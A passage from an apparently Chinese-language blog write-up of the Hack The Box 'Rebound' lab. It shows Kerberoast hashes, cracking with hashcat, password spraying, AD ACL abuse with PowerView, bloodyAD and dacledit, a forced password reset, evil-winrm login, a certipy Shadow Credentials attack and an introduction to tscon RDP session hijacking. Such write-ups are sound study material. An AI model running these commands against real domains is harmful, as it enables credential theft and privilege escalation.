class="emphasis">*krbtgt*</span>$37e8dbc82b39558ec74c37d7$dccebf66d1c8bc563e74079954c881675dffac58038f4d932d6ea98855d2b543a6e3073119e6b754e3e433144d7d2fb27c5744b2cb3923f8a42e1737a88cda75001d5035b2888f0a960c919fc299e5f4828cefacf4534a5f8ba02ad7340fd2a9e756a4913767ff39e0590bf3e7353a5f4bf6605dbe0043658df11c94b92535cf94f4ff43bf5713bd348805c9f7acbcce9e51cdac252517fd27aad06533e7b2bbf94d9ab4005c0df4050f3e6e03ab216c6b778146d82049f1be4a0a16722ba78a1d70e09fac24abfd3d744a1300323de5b0488712df2dbfcbad6e60e99ff0fc19052d1aad89fa4c5dbadea51b1ef6d6709f2bd8aac694160c55b68e14d65c6440ab93d4e40884527236c3e8cdedcb3a307a1d2a643f508957271d2e72faff3c90b1abe66f769b1d7ac74defcc09ca1a533ad444fad681cb27b349cf60bbe2971f79c31e26c606e241ec8c5383f06e0316e9f7578b82670bf131da9f7ca701c8f6cba7c57b7af90fe1621b5ad791fd8c2c73d976a079419424708bca443c47bca1f72976d2df34ecafb6ba02d31bcf7e6a0edb127e814e13472460e220b0ed617ae21325014ad2be6cb9dfd254b471bcba735839943b7b37979352116cbee85aa95c23836f41a18b21170801824019caf01f4efe3d1bcd020d8931b025948cda971b01202b14dfa1c7b7bef2dace68fb8ce7d2b12772a75a11d8ee988b526ab7e2204ef11bedbb43a866fc6c893d35275232681b95309d17494ab80b190364639f7dcaca8a3f25a6e7787e2fc20e38ed0030321b0bf8de2389e57845276930b2569a42e4d60c74f600d104164de6385bf149eb91fdd15f59cc6c1d0f903807a7316e530c29fd8c736c9cb41976d0e93b948bf0b02fc5beb447874aed20efedb6a8ee28408ff035102a3fa99ada1ee66458e40114af337dcb05b9d0708c8af2c4d36844769fe43feec753aaefe098305210c876005110b3d401ceb1f423d7b7edd2d4d1d5dcbe92e47fda08519541ed7bd3da12d0739bfb01b38063a570b91ba9865e77a159b30a3d5c07ff99683faf26f7bf0fb9877a1960abe582f0c1cb0dad5355f7517e34d700b2b244ff40ae734677977006cccae7d0d997cf17422fdff6508dee9c62e4e49ea557ea474d5c06cbd82fc8d12288a418968e43ffc345aad343fbcfcbb4eee7c6cca80e518ded1f252d75e8e7e131b77fa4b8c7dfab9f0ae9d625164a23a574ee3da0032ae9dc82dfc5eef764e94fcb3f84b78f991eb5a1d981841ed1483e2b8b4bef65378d95df974d3bddd9d5e604df1817cea13c811e973f270560791340dfd3388d2ae2af2feb605913d23fc19ba98f68fd0fa336183449803e6321cc6d9394e7666fd40a49edd136f0b99555b5d1802186b0bcc3bdfc89468a11288e64604431e92a6ef7ef73fe0ed271dc0960f9ed705f2b6d648ea77b0eb94a6e4c6d2910072632ed6ce06072e050</span><br><span class="line">[-] Principal: ppaul - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: llune - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: fflock - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: jjones - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: mmalone - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: nnoon - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">$krb5tgs$23$<span class="emphasis">*ldap_monitor$REBOUND.HTB$ldap_monitor*</span>$d0cabacff008f619cfda389fbbb87661$76d52cc9820f937845bf809c8d08d6e207b3454422a014a224ab5ba0505c6f5e328062a52e92f112589097b2fb36a437d712058a127ac4ad536acc07a2ed1c3da678bf4cb99910299650e2be8a4385ee13d94c8c802fe60a1d8de0b422d881dc70f0e1912321701d91e4a08d1d49dd151b41352ddefff5a65343e11c78bda3d1b9235cefac05fc8769cdcd1f4729a0c3d19ed60a624481d9ed636c13d45baf2964c97d933eb7743e4159f14a70e4d85015184a5bd22e9a9016e81b88df9ec1f2c7a11dab9290af97c8b9b2c924951e9e76059757dcc81003aa9a8bb304014a30f94bbd6cfa9338af78ceb6c618aed856355e0af67d9aab65b223d9ba4b8271054cd20193be4074000230102ea644e51d4f458b441a0ab1068be7fd6d4ab3762e044a798eb2c5d942410089d2507ba9d46995ce0753712b8734bde612d75f8846f6cb47057d397ad381920a4211bfe4b0a1cc42ee03eff0e3946430d29f16b9cc56569d24e7d1f11df20980778786f576196596225d5288167317150265e3fad71e7660d0142cc19f2225cedb64ee5bd03698df39955876a53a3eb2b3a16a8964b4b97cbf1ca6a1a39e3fa09d3cebe2a9bc7e41558017c7223910dfe9581ccdfdc2f4bc6f4a849459a8a214fca4b1737d352c43a39e049c0d8ebc42449cd9b542d03be6d5082581019cf1e0da2c4a2e465f45a99888b492ee71fee82cb9355bc4682e906304fdf4925afbe60233f33d1d570e5dfec08824a559f07db09085ccac08e57dc6146f14aa84eafb005e3c0de493699c81f94b7efa0926275f8b32d80cc96e4aa08310d89e1f5c8f3920bd1d968b0c8b39965a927e792f99d4e1b9f9a72e5eec2ee5e8d7fc240fc54d2874fe7c79d561849dc33dd8e246653acc2442c695fc3209b9c8270ea72b61627b6d5de4c1c4664f50bb60369bd944d993075914d396ce05ace9af55316662720acbcab2797b7e778c53d631d4942c63a9e3aa35ae7964a27d1adaca673c3ba561bec09689d8af075c3ec961d51d9698cf89f77a8eeff3c704bf00981142c48937ef4c939715bc27803d98274de4dc44bc062dfe6581cc77dd4afbd19854ce1b3f7dff0491db396076268170b0c0f9385ff486a9cf8accf97e171474dd1843d60b6042bf80756f8dd549008f21f263d1b8639d34a254a49454396e98461a499beb0faa28655a68a92bc02852f50f20045a5138b6cf6eb7348d601494f380ba568a64b5a1c4015c60bf6607265e032302f0b2e49d94111fc9b00fc624c3d4621e651acc8a6fd0a467a34ef27dd5e2f751b07c93265800a3fb010bae89ebb641fcd5b4736e0563cd3be2399bca4b7ea48ac7e5cb9de664</span><br><span class="line">[-] Principal: oorend - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: winrm<span class="emphasis">_svc - Kerberos SessionError: KDC_</span>ERR<span class="emphasis">_S_</span>PRINCIPAL<span class="emphasis">_UNKNOWN(Server not found in Kerberos database)</span></span><br><span class="line"><span class="emphasis">[-] Principal: batch_</span>runner - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: tbrady - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相比于krbtgt账户，我们破解ldap_monitor账户的可能性要大得多，我们从这个账户入手，选择TGS-REP模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hashcat -m 13100 <span class="string">&#x27;$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$d0cabacff008f619cfda389fbbb87661$76d52cc9820f937845bf809c8d08d6e207b3454422a014a224ab5ba0505c6f5e328062a52e92f112589097b2fb36a437d712058a127ac4ad536acc07a2ed1c3da678bf4cb99910299650e2be8a4385ee13d94c8c802fe60a1d8de0b422d881dc70f0e1912321701d91e4a08d1d49dd151b41352ddefff5a65343e11c78bda3d1b9235cefac05fc8769cdcd1f4729a0c3d19ed60a624481d9ed636c13d45baf2964c97d933eb7743e4159f14a70e4d85015184a5bd22e9a9016e81b88df9ec1f2c7a11dab9290af97c8b9b2c924951e9e76059757dcc81003aa9a8bb304014a30f94bbd6cfa9338af78ceb6c618aed856355e0af67d9aab65b223d9ba4b8271054cd20193be4074000230102ea644e51d4f458b441a0ab1068be7fd6d4ab3762e044a798eb2c5d942410089d2507ba9d46995ce0753712b8734bde612d75f8846f6cb47057d397ad381920a4211bfe4b0a1cc42ee03eff0e3946430d29f16b9cc56569d24e7d1f11df20980778786f576196596225d5288167317150265e3fad71e7660d0142cc19f2225cedb64ee5bd03698df39955876a53a3eb2b3a16a8964b4b97cbf1ca6a1a39e3fa09d3cebe2a9bc7e41558017c7223910dfe9581ccdfdc2f4bc6f4a849459a8a214fca4b1737d352c43a39e049c0d8ebc42449cd9b542d03be6d5082581019cf1e0da2c4a2e465f45a99888b492ee71fee82cb9355bc4682e906304fdf4925afbe60233f33d1d570e5dfec08824a559f07db09085ccac08e57dc6146f14aa84eafb005e3c0de493699c81f94b7efa0926275f8b32d80cc96e4aa08310d89e1f5c8f3920bd1d968b0c8b39965a927e792f99d4e1b9f9a72e5eec2ee5e8d7fc240fc54d2874fe7c79d561849dc33dd8e246653acc2442c695fc3209b9c8270ea72b61627b6d5de4c1c4664f50bb60369bd944d993075914d396ce05ace9af55316662720acbcab2797b7e778c53d631d4942c63a9e3aa35ae7964a27d1adaca673c3ba561bec09689d8af075c3ec961d51d9698cf89f77a8eeff3c704bf00981142c48937ef4c939715bc27803d98274de4dc44bc062dfe6581cc77dd4afbd19854ce1b3f7dff0491db396076268170b0c0f9385ff486a9cf8accf97e171474dd1843d60b6042bf80756f8dd549008f21f263d1b8639d34a254a49454396e98461a499beb0faa28655a68a92bc02852f50f20045a5138b6cf6eb7348d601494f380ba568a64b5a1c4015c60bf6607265e032302f0b2e49d94111fc9b00fc624c3d4621e651acc8a6fd0a467a34ef27dd5e2f751b07c93265800a3fb010bae89ebb641fcd5b4736e0563cd3be2399bca4b7ea48ac7e5cb9de664&#x27;</span> /usr/share/wordlists/rocknew/rockyou.txt  --potfile-disable -O -w 3</span><br></pre></td></tr></table></figure><p>可以发现破解成功</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218212235.png" alt="微信截图_20250218212235"></p><p>我们测试一下我们的凭据<strong>ldap_monitor:1GR8t@$$4u</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc smb rebound.htb -u ldap_monitor -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> </span><br></pre></td></tr></table></figure><p>smb可以正常登录</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218212634.png" alt="微信截图_20250218212634"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc winrm rebound.htb -u ldap_monitor -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span></span><br></pre></td></tr></table></figure><p>winrm协议登录失败</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218212836.png" alt="微信截图_20250218212836"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc ldap rebound.htb -u ldap_monitor -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218212954.png" alt="微信截图_20250218212954"></p><p>这里出现了一条提示<code>LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using &#39;-k&#39;.</code></p><p>表明<strong>LDAPS（LDAP over SSL）通道绑定可能已启用，而通道绑定仅支持 Kerberos 认证。因此，尝试使用 <code>-k</code> 选项来启用 Kerberos 认证。</strong></p><p>我们加上<code>-k</code>参数重新验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc ldap rebound.htb -u ldap_monitor -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -k</span><br></pre></td></tr></table></figure><p>出现了下面的问题<code>KRB_AP_ERR_SKEW</code></p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218214921.png" alt="微信截图_20250218214921"></p><p>这表示<strong>客户端和服务器的时间不同步</strong>，导致 Kerberos 无法正确验证票据，这里因为使用<code>ntpdate</code>同步时间会导致我的HTB VPN挂掉，所以这里使用<code>faketime</code>这个工具进行时间伪造，我使用<code>ntpdate</code>查看与域控相隔的时间</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2025-02-20 02:11:08.970646 (+0800) +24170.331702 +/- 0.248765 rebound.htb 10.10.11.231 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 24170.331702</span><br></pre></td></tr></table></figure><p>换算一下也就是</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250219193251.png" alt="微信截图_20250219193251"></p><p>利用工具将本地时间向前调快6小时42 分钟（调慢是ago）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;6 hours 42 minutes&#x27;</span> nxc ldap rebound.htb -u ldap_monitor -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -k</span><br></pre></td></tr></table></figure><p>认证上了，森哥牛逼，哭了</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250219193627.png" alt="微信截图_20250219193627"></p><h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>考虑到ldap_monitor这个服务账号的管理者可能复用密码在普通的用户账号上，我们对我们已经获得的账户名进行密码喷洒</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc smb rebound.htb -u <span class="built_in">users</span> -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -d rebound.htb --continue-on-success</span><br></pre></td></tr></table></figure><p>观察结果发现存在一个用户账号使用了相同的密码，现在我们拥有了两组凭据</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250219194542.png" alt="微信截图_20250219194542"></p><p>对<code>oorend</code>这个账户的权限进行验证</p><p>smb正常</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220161231.png" alt="微信截图_20250220161231"></p><p>winrm仍然没有权限</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220161338.png" alt="微信截图_20250220161338"></p><p>ldap正常</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220161449.png" alt="微信截图_20250220161449"></p><h2 id="尝试获取立足点"><a href="#尝试获取立足点" class="headerlink" title="尝试获取立足点"></a>尝试获取立足点</h2><p>利用smb协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-smbexec rebound.htb\oorend:<span class="string">&#x27;1GR8t@$$4u&#x27;</span>@rebound.htb -dc-ip rebound.htb</span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220161936.png" alt="微信截图_20250220161936"></p><p>如上图均无权限</p><h2 id="手工枚举"><a href="#手工枚举" class="headerlink" title="手工枚举"></a>手工枚举</h2><p>我们利用powerview.py进行手工枚举，首先连接到靶机的ldap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> powerview rebound.htb/ldap_monitor:<span class="string">&#x27;1GR8t@$$4u&#x27;</span>@10.10.11.231 -k</span><br></pre></td></tr></table></figure><p>查看一下两个用户的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -Identity ldap_monitor</span><br><span class="line"></span><br><span class="line">ldap_monitor Sid S-1-5-21-4078382237-1492182817-2568127209-7681</span><br><span class="line">oorend Sid S-1-5-21-4078382237-1492182817-2568127209-7682</span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220165641.png" alt="微信截图_20250220165641"></p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220165739.png" alt="微信截图_20250220165739"></p><p>利用Sid枚举AD对象的访问控制列表（ACL）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObjectAcl -SecurityIdentifier S-1-5-21-4078382237-1492182817-2568127209-7682</span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220170657.png" alt="微信截图_20250220170657"></p><p>我们关注一下oorend的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb</span><br><span class="line">ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683</span><br><span class="line">ACEType                     : ACCESS_ALLOWED_ACE</span><br><span class="line">ACEFlags                    : None</span><br><span class="line">ActiveDirectoryRights       : Self</span><br><span class="line">AccessMask                  : Self</span><br><span class="line">InheritanceType             : None</span><br><span class="line">SecurityIdentifier          : REBOUND\oorend</span><br></pre></td></tr></table></figure><p>我们观察到<code>oorend</code>用户允许对<code>ServiceMgmt</code>这个组进行特定的操作，<code>AccessMask</code>和<code>ActiveDirectoryRights</code>均为<code>Self</code>，表示该权限条目允许对象自己对自己进行某些操作，那么我们考虑将其自身加入到<code>ServiceMgmt</code>这个看起来像一个低层级的管理组中</p><blockquote><p><code>AccessMask</code>权限分类</p><ul><li><code>0x0001</code>：读取权限。</li><li><code>0x0002</code>：写入权限。</li><li><code>0x0004</code>：执行权限。</li></ul></blockquote><p>继续延展攻击链条，枚举系统OU</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainOU  </span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220174212.png" alt="微信截图_20250220174212"></p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220174229.png" alt="微信截图_20250220174229"></p><p>可以观察到只有两个OU，其中一个为<code>Service Users</code>，紧接着我们上面的攻击链开始，如果为<code>oorend</code>写入对<code>ServiceMgmt</code>的<code>GenericAll</code>权限，我们就能获得对<code>Service Users</code>的控制权</p><p>我们继续往下推进，我们看一下<code>ServiceMgmt</code>是否属于<code>Service Users</code>组中，我们查看<code>Service Users</code>的ACL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObjectAcl -Identity <span class="string">&quot;OU=Service Users,DC=rebound,DC=htb&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220175638.png" alt="微信截图_20250220175638"></p><p>上图和我们的预期一致，<code>ServiceMgmt</code> 组在 <code>rebound.htb</code> 域中对 <strong>OU=Service Users</strong> 这个组织单位有 <strong>完全控制（FullControl）</strong> 权限</p><p>现在拿到了OU的权限，接下来延伸OU向外的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObject -SearchBase <span class="string">&quot;OU=Service Users,DC=rebound,DC=htb&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>我们指定搜索的起点从<code>&quot;OU=Service Users,DC=rebound,DC=htb&quot;</code>开始</p><p>查询<code>Service Users</code> 组织单位（OU）下的所有对象（如用户、计算机、组等）。</p><p>返回该 OU 内所有对象的详细信息，如：</p><ul><li>Distinguished Name (DN)</li><li>Object Class (对象类别，如 User、Group)</li><li>Security Identifier (SID)</li><li>访问权限（ACL）</li><li>组成员关系等</li></ul></blockquote><p>里面存在两个账户的名称，<code>batch_runner</code>和<code>winrm_svc</code>，这里不关注批处理这个账户，关注这个可能给我们带来winrm远程访问权限的账户</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220180912.png" alt="微信截图_20250220180912"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainGroup -MemberIdentity <span class="string">&quot;winrm_svc&quot;</span></span><br></pre></td></tr></table></figure><p>确认在<code>Service Users</code>OU下</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220181046.png" alt="微信截图_20250220181046"></p><p>完整的攻击链条已经构建完成了，我们拥有了对<code>Service Users</code>的完全控制，并且<code>Service Users</code>包含<code>winrm_svc</code>账户，我们强制对<code>winrm_svc</code>用户密码进行修改就能获得对远程主机的winrm访问权限</p><h2 id="bloodhound-python-自动化枚举"><a href="#bloodhound-python-自动化枚举" class="headerlink" title="bloodhound-python 自动化枚举"></a>bloodhound-python 自动化枚举</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d rebound.htb -c all -u oorend -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -ns 10.10.11.231 --zip -k</span><br></pre></td></tr></table></figure><h2 id="获取winrm远程访问权限"><a href="#获取winrm远程访问权限" class="headerlink" title="获取winrm远程访问权限"></a>获取winrm远程访问权限</h2><p>获取<code>ServiceMgmt</code>组成员</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainGroupMember -Identity ServiceMgmt</span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220181630.png" alt="微信截图_20250220181630"></p><p>增加<code>oorend</code>为<code>ServiceMgmt</code>组成员，此时注意登录的凭据为<code>oorend</code>的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainGroupMember -Identity ServiceMgmt -Members oorend</span><br></pre></td></tr></table></figure><p>进行前后组成员对比</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220194132.png" alt="微信截图_20250220194132"></p><p>利用bloodyAD为<code>Service Users</code>添加<code>GenericAll</code>权限，注意操作要迅速，因为<code>oorend</code>账户会从<code>ServiceMgmt</code>账户中掉出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host 10.10.11.231 -u oorend -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> add genericAll <span class="string">&quot; OU=Service Users,DC=rebound,DC=htb&quot;</span> oorend</span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220213041.png" alt="微信截图_20250220213041"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host 10.10.11.231 -u oorend -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> <span class="built_in">set</span> password winrm_svc Chromos2me    </span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220213651.png" alt="微信截图_20250220213651"></p><p>利用evil-winrm进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo evil-winrm -i rebound.htb -u winrm_svc -p Chromos2me  </span><br></pre></td></tr></table></figure><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220213849.png" alt="微信截图_20250220213849"></p><p>接下来获得user.txt即可</p><h2 id="利用Shadow-Credentials（替代修改winrm-svc的密码）"><a href="#利用Shadow-Credentials（替代修改winrm-svc的密码）" class="headerlink" title="利用Shadow Credentials（替代修改winrm_svc的密码）"></a>利用Shadow Credentials（替代修改<code>winrm_svc</code>的密码）</h2><p>修改密码的方式会在一段时间后失效，同时修改密码的操作可能会引起蓝队操作人员的关注，我们使用另一种方式实现<code>shell</code>的获取，即<code>Shadow Credentials</code>，这种方法会给我们提供<code>winrm_svc</code>账户的哈希，我们仍然可以用于<code>winrm</code>登录，也叫做<code>UnPAC the hash</code>，主要流程在之后的文章中介绍，先给一个流程图</p><p><img src="/2025/03/02/HTB-Rebound/unpacthehash_schema.webp" alt="unpacthehash_schema"></p><p>在我们获得对<code>Service Users</code>组的<code>GenericAll</code>权限（即我们所熟知的<code>FullControl</code>）之后，我们将<code>FullControl</code>权限延展到属于这个OU的对象中，我们关注一下BloodHound中的<code>Descendant Objects</code></p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250223163937.png" alt="微信截图_20250223163937"></p><p>我们将权限拓展到子对象<code>winrm_svc</code>上，下面的命令效果和我们之前的bloodyAD实现的一样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-dacledit rebound.htb/oorend:<span class="string">&#x27;1GR8t@$$4u&#x27;</span> -k -dc-ip 10.10.11.231 -action write -rights FullControl -inheritance -principal oorend -target-dn <span class="string">&quot;OU=Service Users,DC=rebound,DC=htb&quot;</span> -use-ldaps</span><br></pre></td></tr></table></figure><blockquote><p><code>impacket-dacledit</code>：用于编辑 Active Directory 对象的<code>DACL（Discretionary Access Control List）</code>。它可以用于修改对象的权限，赋予指定用户不同级别的权限。</p><p><strong><code>-rights FullControl</code></strong>:  指定要分配给目标用户或组的权限。</p><p><strong><code>-inheritance</code></strong>：表示权限继承。这意味着权限将从父对象传递给目标对象的子对象。</p><p><strong><code>-principal oorend</code></strong>：目标用户或组。在这种情况下，<code>oorend</code> 用户将获得指定权限（<code>FullControl</code>）到目标对象。</p><p><strong><code>-target-dn &quot;OU=Service Users,DC=rebound,DC=htb&quot;</code></strong>：指定目标对象的 Distinguished Name (DN)，即我们要修改的 AD 对象。</p></blockquote><p>执行Shadow Credentials攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy shadow auto -u oorend@rebound.htb -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -account winrm_svc -target dc01.rebound.htb -dc-ip 10.10.11.231 -k</span><br></pre></td></tr></table></figure><p>或者参考下面的文章</p><p><a href="https://blog.csdn.net/qq_41874930/article/details/119637917">https://blog.csdn.net/qq_41874930/article/details/119637917</a></p><h2 id="Cross-Session-Lateral-Movement"><a href="#Cross-Session-Lateral-Movement" class="headerlink" title="Cross Session Lateral Movement"></a>Cross Session Lateral Movement</h2><p><code>winrm_svc</code>用户家目录没有其他有价值的东西</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250223173517.png" alt="微信截图_20250223173517"></p><blockquote><p>使用<code>ls -recurse .</code>也是一个不错的选择</p></blockquote><p>我们现在要确定下一步的高价值目标，我们在查看当前机器上运行的进程时发现存在两个session，也就是说这台机器上还存在另一个已经登录的用户</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250223174952.png" alt="微信截图_20250223174952"></p><p>那么我们可以猜测另一个已经登录的账户可能是一个高特权账户，我们需要对其进行利用</p><p>我们这里有一个命令<code>qwinsta</code>（Query WINdows STAtion）是 Windows 内置的命令行工具，用于查询当前系统上的远程桌面会话（RDP 会话）或本地会话的状态信息。</p><blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;qwinsta [用户名 | 会话名 | 会话 <span class="type">ID</span>] [/<span class="type">server</span>:服务器名] [/<span class="type">mode</span>] [/<span class="type">connect</span>] [/<span class="type">counter</span>]</span><br></pre></td></tr></table></figure><p>常见的参数有</p><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td><code>无参数</code></td><td>显示本地计算机上的所有会话信息。</td></tr><tr><td><code>/server:&lt;服务器&gt;</code></td><td>指定查询的远程服务器（默认为本地）。</td></tr><tr><td><code>&lt;用户名&gt;</code></td><td>查询指定用户的会话信息。</td></tr><tr><td><code>&lt;会话名&gt;</code></td><td>查询指定会话名的会话信息。</td></tr><tr><td><code>&lt;会话 ID&gt;</code></td><td>查询指定会话 ID 的会话信息。</td></tr><tr><td><code>/mode</code></td><td>显示会话的当前模式（如连接模式）。</td></tr><tr><td><code>/connect</code></td><td>显示连接的详细信息。</td></tr><tr><td><code>/counter</code></td><td>显示会话的统计数据。</td></tr></tbody></table></div><p>在我们具有特定的Windows权限时，我们可以劫持管理员RDP会话</p><p><code>tscon</code>（Terminal Services CONnect）是 Windows 终端服务的一个命令行工具，用于连接或切换到指定的远程桌面会话（RDP 会话）。在权限足够的情况下，攻击者可以利用它来劫持管理员的 RDP 会话，从而无需凭据直接获取管理员权限。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;tscon &lt;SessionID&gt; [/<span class="type">dest</span>:&lt;<span class="type">DestinationName</span>&gt;] [/<span class="type">password</span>:&lt;<span class="type">Password</span>&gt;] [/<span class="type">v</span>]</span><br></pre></td></tr></table></figure><p>参数有</p><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td><code>&lt;SessionID&gt;</code></td><td>需要切换的会话 ID，可使用 <code>qwinsta</code> 查询。</td></tr><tr><td><code>/dest:&lt;目标&gt;</code></td><td>目标会话名称（如 